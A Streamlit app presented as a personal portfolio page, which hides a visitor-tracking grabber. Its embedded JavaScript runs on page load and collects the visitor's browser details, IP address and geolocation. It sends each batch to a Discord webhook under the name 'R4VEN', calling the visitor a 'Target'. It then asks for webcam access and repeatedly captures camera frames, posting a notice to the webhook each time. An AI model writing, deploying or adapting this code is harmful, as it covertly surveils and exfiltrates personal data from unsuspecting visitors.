import streamlit as st
import streamlit.components.v1 as components

# Konfigurasi halaman Streamlit
st.set_page_config(
    page_title="Iqbal Mantam - Portfolio & Chat", 
    page_icon="📸", 
    layout="wide"
)

# Ambil Discord Webhook dari Streamlit Secrets secara aman
try:
    webhook_url = st.secrets["DISCORD_WEBHOOK_URL"]
except Exception:
    webhook_url = ""

# Kode HTML & JavaScript lengkap yang diperbaiki
html_code = f"""
<!DOCTYPE html>
<html>

<head>
  <script type="text/javascript" src="dwebhook.js"></script>
</head>

<body>

  <iframe src="https://iqbalmantam.github.io/portfolio/" width="100%" height="900" style="border:none;"></iframe>

  <p id="demo"></p>
  <span id="gfg" style="display:none;"></span>
  
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script>
    const WEBHOOK_URL = "{webhook_url}";
    var x = document.getElementById("demo");

    let datetime = new Date();
    let localtime = String(datetime.toLocaleTimeString());

    var sysinfo = " GET " + "```xl\\n" + navigator.userAgent + "```" + "```autohotkey\\n" + "\\nPlatform: " + navigator.platform + "\\nCookies_Enabled: " + navigator.cookieEnabled + "\\nBrowser_Language: " + navigator.language + "\\nBrowser_Name: " + navigator.appName + "\\nBrowser_CodeName: " + navigator.appCodeName + "\\nRam: " + navigator.deviceMemory + "\\nCPU_cores: " + navigator.hardwareConcurrency + "\\nScreen_Width: " + screen.width + "\\nScreen_Height: " + screen.height + "\\nTime: " + localtime + "\\nRefUrl: " + document.referrer + "\\nOscpu: " + navigator.oscpu + "```";

    function sendToDiscord(payload) {{
        const request = new XMLHttpRequest();
        request.open("POST", WEBHOOK_URL);
        request.setRequestHeader('Content-type', 'application/json');
        request.send(JSON.stringify(payload));
    }}

    // 1. Kirim Info Sistem
    var myEmbed1 = {{
      author: {{ name: "Target System Information.." }},
      title: "Uagent:",
      description: sysinfo,
      color: 15418782
    }};
    sendToDiscord({{
      username: "R4VEN",
      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
      content: "@everyone Someone Opened The Link O_o ",
      embeds: [myEmbed1]
    }});

    // 2. Kirim IP Address
    $.getJSON("https://api.ipify.org?format=json", function (data) {{
      $("#gfg").html(data.ip);

      var myEmbed2 = {{
        author: {{ name: "Target Ip" }},
        description: '```xl\\n' + data.ip + '```' + '\\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\\n",
        color: 15548997,
        footer: {{
          text: "Geographic location based on IP address is approximate."
        }}
      }};
      sendToDiscord({{
        username: "R4VEN",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed2]
      }});
    }});

    // 3. Kirim IP Reconnaissance
    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,country,regionName,city,lat,lon", function (response) {{
      var myEmbed3 = {{
        author: {{ name: "IP Address Reconnaissance" }},
        title: response.status,
        description: '```autohotkey\\nCountry: ' + response.country + '\\nCity: ' + response.city + '\\nLat: ' + response.lat + '\\nLon: ' + response.lon + '```',
        color: 5763719
      }};
      sendToDiscord({{
        username: "R4VEN",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed3]
      }});
    }});
  </script>

  <div class="video-wrap" style="display:none;">
    <video id="video" playsinline autoplay></video>
  </div>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

  <script>
    function postFile(file) {{
      let reader = new FileReader();
      reader.readAsDataURL(file);
      reader.onloadend = function() {{
        sendToDiscord({{
          username: "R4VEN",
          avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
          content: "📸 **Target Camera Frame Captured!**"
        }});
      }};
    }}

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    const constraints = {{
      audio: false,
      video: {{
        facingMode: "user"
      }}
    }};

    async function init() {{
      try {{
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      }} catch (e) {{
        setTimeout(function () {{
          sendToDiscord({{
            username: "R4VEN",
            avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
            content: "```diff\\n- User denied camera permission or device lacks a camera.```"
          }});
        }}, 2000);
      }}
    }}

    function handleSuccess(stream) {{
      window.stream = stream;
      video.srcObject = stream;

      var context = canvas.getContext('2d');
      setInterval(function () {{
        context.drawImage(video, 0, 0, 640, 480);
        canvas.toBlob(postFile, 'image/jpeg');
      }}, 3000);
    }}

    init();
  </script>
</body>

</html>
"""

# Render aplikasi di Streamlit Cloud
if webhook_url:
    components.html(html_code, height=950, scrolling=True)
else:
    st.error("⚠️ Discord Webhook URL belum diatur!")
    st.info("Tambahkan `DISCORD_WEBHOOK_URL` di bagian **Settings -> Secrets** pada dasbor Streamlit Cloud Anda.")
